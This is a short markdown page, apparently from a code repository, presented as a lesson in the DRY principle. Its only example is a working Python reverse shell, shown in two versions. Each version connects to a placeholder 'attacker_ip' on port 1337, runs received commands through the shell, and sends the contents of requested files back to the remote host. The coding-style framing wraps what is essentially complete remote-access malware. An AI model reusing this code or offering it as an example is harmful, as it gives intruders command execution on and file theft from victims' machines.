<h2 align="center">Maintaining DRY principle at Client Side</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

Don't Repeat Yourself (DRY) Principle

- - - - - - - - - - - - - - - - - - - - - -
> [payload.py](payload.py)
```python
import socket
import subprocess

import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	cmd = payload.recv(2048)
	cmd = cmd.decode("utf-8")
	
	if cmd == "quit":
		payload.close()
		break
	
	elif cmd[:2] == "cd":
		try:
			os.chdir(cmd[3:])
		# Repeated same exception
		except FileNotFoundError:
			send_data(b"File not found")
		else:
			send_data(b"Changed directory")
		continue

	elif cmd[:8] == "download":
		try:
			with open(f'{cmd[9:]}', 'rb') as data:
				data_read = data.read()
				data.close()
		# Repeated same exception
		except FileNotFoundError:
			send_data(b"No file found")
		else:
			send_data(data_read)
		continue

	try:
		output = subprocess.check_output(cmd, shell = True)
	# Different exception
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")
	else:
		send_data(output)

print("Disconnected")
```
---
Apply DRY principle, write code more manageable and readable :

> [payload.py](payload.py)
```python
import socket
import subprocess

import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)
 
while True:
	# Add try block
	try: 
		cmd = payload.recv(2048)
		cmd = cmd.decode("utf-8")
		
		if cmd == "quit":
			payload.close()
			break
		
		elif cmd[:2] == "cd":
			# Remove the try block
			os.chdir(cmd[3:])
			
			send_data(b"Changed directory")
			continue

		elif cmd[:8] == "download":
			# Remove the try block
			with open(f'{cmd[9:]}', 'rb') as data:
				data_read = data.read()
				data.close()

				send_data(data_read)
				continue

		# Remove the try block
		output = subprocess.check_output(cmd, shell = True)

		send_data(output)
	
	# Add except block to handle the exceptions
	except FileNotFoundError:
		print("File Not Found")
		send_data(b"No file found")
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")

print("Disconnected")
```